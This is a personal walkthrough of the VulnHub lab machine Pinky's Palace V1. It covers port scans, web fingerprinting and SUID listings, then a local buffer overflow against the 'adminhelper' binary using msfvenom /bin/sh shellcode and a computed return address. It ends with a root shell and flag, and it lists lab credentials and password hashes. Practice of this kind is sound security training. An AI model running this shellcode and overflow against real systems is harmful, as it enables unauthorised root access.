# BOX NAME: Pinky's Palace V1
**LINK**: https://www.vulnhub.com/entry/pinkys-palace-v1,225

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate the box, pull hair. 
2. Find the squidproxy and read up. Try some ip ranges and localhost.
3. fuzz the webserver once proxy is found. find hidden login form. sqlmap that stuff.
4. Get the DB and try to login. Nothing. Try SSH as pinkymanage
5. Enumerate local, and find rsa key to pinky.
6. Buffer overflow the adminhelper in pinkys home folde.r

This box was hard. I really suck at BO on linux. This however taught me a new technique to find the return address. Or atleast where the exploit itself is stored on the binary. That's cool, and it's from a book I actually have. I guess I have to read it now.

Great stuff, on to the next box in the series!
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.73
[+] URL:	
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ cat nmap-pinkys1.log
# Nmap 7.93 scan initiated Sat May  6 14:03:50 2023 as: nmap -p8080,31337,64666 -sV -sC -oN nmap-pinkys1.log 10.77.0.73
Nmap scan report for 10.77.0.73
Host is up (0.00067s latency).

PORT      STATE SERVICE    VERSION
8080/tcp  open  http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  http-proxy Squid http proxy 3.5.23
|_http-server-header: squid/3.5.23
|_http-title: ERROR: The requested URL could not be retrieved
64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 df02124f4c6d50276a84e90e5b65bfa0 (RSA)
|   256 0aadaac716f71507f0a8502317f31c2e (ECDSA)
|_  256 4a2de5d8ee696155bbdbaf294e54522f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  6 14:04:17 2023 -- 1 IP address (1 host up) scanned in 26.54 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
8080;
└─$ whatweb $URL:8080 --log-verbose=whatweb-pinkys-8080.log --follow-redirect=always
http://pinkys:8080 [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.10.3], IP[10.77.0.73], Title[403 Forbidden], nginx[1.10.3]

31337;
http://pinkys:31337 [400 Bad Request] Content-Language[en], Country[RESERVED][ZZ], Email[webmaster], HTTPServer[squid/3.5.23], IP[10.77.0.73], Squid-Web-Proxy-Cache[3.5.23], Title[ERROR: The requested URL could not be retrieved], UncommonHeaders[x-squid-error], Via-Proxy[1.1 pinkys-palace (squid/3.5.23)], X-Cache[pinkys-palace,pinkys-palace:31337]


```

nikto-scan
```

```

fuzzing
```

```
other
```

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```
/bin/umount                                                                                                                       
/bin/su                                                                                                                           
/bin/mount                                                                                                                        
/bin/ping                                                                                                                         
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                       
/usr/lib/squid/pinger                                                                                                            
/usr/lib/eject/dmcrypt-get-device                                                                                                 penssh/ssh-keysign
/usr/bin/chsh                                                                                                                     
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo 
```
**SGID's**:

```
pinkymanage@pinkys-palace:~$ find / -perm -g=s -type f 2>/dev/null                                                                
/sbin/unix_chkpwd                                                                                                                 
/usr/bin/chage                                                                                                                    
/usr/bin/wall                                                                                                                     
/usr/bin/dotlockfile
/usr/bin/ssh-agent
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/expiry
```
**OTHERS**:

```

```
</details>

# BUFFER OVERFLOW
<details><summary><ins>Methodology</ins></summary>

```
/* yaojingguo commented on Nov 8, 2016The code is from Page 147 and 148 of Hacking: The Art of Exploitation, 2nd Edition . */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
```
```
└─$ msfvenom -a x64 -p linux/x64/exec CMD=/bin/sh -b '\x00\x0b\x0d\x0a\x18\x0c\x23\x24\x28\x29' | hexdump -v -e '"\\\x" 1/1 "%02x"'
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=9, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 87 (iteration=0)
x64/xor chosen with final size 87
Payload size: 87 bytes

\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x67\xa7\xc8\x94\xac\x7f\xdf\xbf\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x2f\x1f\xe7\xf6\xc5\x11\xf0\xcc\x0f\xa7\x51\xc4\xf8\x20\x8d\xd9\x0f\x8a\xab\xc0\xf2\x2d\x37\xb7\x67\xa7\xc8\xbb\xce\x16\xb1\x90\x14\xcf\xc8\xc2\xfb\x2b\x81\xd5\x5c\xff\xc7\x91\xac\x7f\xdf\xbf
```

```
export EXPL=`python -c 'print "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xbe\xbe\x34\xd9\x6a\xef\x70\x31\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf6\x06\x1b\xbb\x03\x81\x5f\x42\xd6\xbe\xad\x89\x3e\xb0\x22\x57\xd6\x93\x57\x8d\x34\xbd\x98\x39\xbe\xbe\x34\xf6\x08\x86\x1e\x1e\xcd\xd6\x34\x8f\x3d\xbb\x2e\x5b\x85\xe6\x3b\xdc\x6a\xef\x70\x31"'`
```

```
./adminhelper `python -c 'print "A"*72+"\x3a\xee\xff\xff\xff\x7f"` 
```

```
1. So the gist of it all is. Generate shellcode and store in in a variable. 
2. Find the return-address with the help of the yaojinguo suid.c
3. Export the adminhelper and BAM.
4. Root shell.
``` 

</details>

# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4be0cc32aba02ec4e0f010047be5ae9dee756960, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 9.3 (stretch)
Release:        9.3
Codename:       stretch


Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

pinkymanage:3pinkysaf33pinkysaf3	
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
+-----+----------------------------------+-------------+
| uid | pass                             | user        |
+-----+----------------------------------+-------------+
| 1   | f543dbfeaf238729831a321c7a68bee4 | pinky       |
| 2   | d60dffed7cc0d87e1f4a11aa06ca73af | pinkymanage |
+-----+----------------------------------+-------------+

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
pinky@pinkys-palace:~$ ./adminhelper `python -c 'print "A"*72+"\x3a\xee\xff\xff\xff\x7f"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:����
# id    
uid=1000(pinky) gid=1000(pinky) euid=0(root) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
# ls /root/
root.txt
# cat /root/root.txt
===========[!!!CONGRATS!!!]===========

[+] You r00ted Pinky's Palace Intermediate!
[+] I hope you enjoyed this box!
[+] Cheers to VulnHub!
[+] Twitter: @Pink_P4nther

Flag: 99975cfc5e2eb4c199d38d4a2b2c03ce
```

```

```

```

```

</details>